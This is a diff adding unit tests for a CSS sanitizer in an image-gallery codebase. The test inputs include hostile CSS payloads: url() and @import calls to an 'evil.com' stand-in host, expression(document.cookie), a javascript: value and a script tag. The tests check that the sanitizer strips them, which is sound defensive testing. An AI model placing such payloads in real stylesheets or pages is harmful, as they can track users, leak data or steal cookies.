@@ -12,8 +12,10 @@ import {
   toDisplayImage,
   generateGalleryId,
   generateSlug,
+  sanitizeCustomCss,
   SUPPORTED_IMAGE_EXTENSIONS,
   DEFAULT_GALLERY_CONFIG,
+  MAX_CUSTOM_CSS_LENGTH,
   type GalleryImageRecord,
   type GalleryTagRecord,
 } from "./index";
@@ -393,6 +395,68 @@ describe("generateSlug", () => {
     it("handles collection name", () => {
       expect(generateSlug("My Vacation Photos!")).toBe("my-vacation-photos");
     });
+  });
+});
+
+// =============================================================================
+// sanitizeCustomCss - CSS security sanitization
+// =============================================================================
+
+describe("sanitizeCustomCss", () => {
+  it("returns null for null/undefined/empty", () => {
+    expect(sanitizeCustomCss(null)).toBeNull();
+    expect(sanitizeCustomCss(undefined)).toBeNull();
+    expect(sanitizeCustomCss("")).toBeNull();
+    expect(sanitizeCustomCss("   ")).toBeNull();
+  });
+
+  it("preserves safe CSS", () => {
+    expect(sanitizeCustomCss(".gallery { color: red; }")).toBe(
+      ".gallery { color: red; }",
+    );
+    expect(sanitizeCustomCss("body { background: #fff; }")).toBe(
+      "body { background: #fff; }",
+    );
+  });
+
+  it("strips url() calls (data exfiltration risk)", () => {
+    const result = sanitizeCustomCss(
+      '.gallery { background: url("https://evil.com/track"); }',
+    );
+    expect(result).not.toContain("url(");
+    expect(result).toContain("/* removed */");
+  });
+
+  it("strips @import rules", () => {
+    const result = sanitizeCustomCss(
+      '@import url("https://evil.com/inject.css"); .gallery {}',
+    );
+    expect(result).not.toContain("@import");
+  });
+
+  it("strips expression() calls", () => {
+    const result = sanitizeCustomCss(
+      ".gallery { width: expression(document.cookie); }",
+    );
+    expect(result).not.toContain("expression(");
+  });
+
+  it("strips javascript: protocol", () => {
+    const result = sanitizeCustomCss(
+      ".gallery { background: javascript:alert(1); }",
+    );
+    expect(result).not.toContain("javascript:");
+  });
+
+  it("strips script tags", () => {
+    const result = sanitizeCustomCss(".gallery {} <script>alert(1)</script>");
+    expect(result).not.toContain("<script");
+  });
+
+  it("enforces length limit", () => {
+    const longCss = ".a{color:red}".repeat(10000);
+    const result = sanitizeCustomCss(longCss);
+    expect(result!.length).toBeLessThanOrEqual(MAX_CUSTOM_CSS_LENGTH);
   });
 });
 
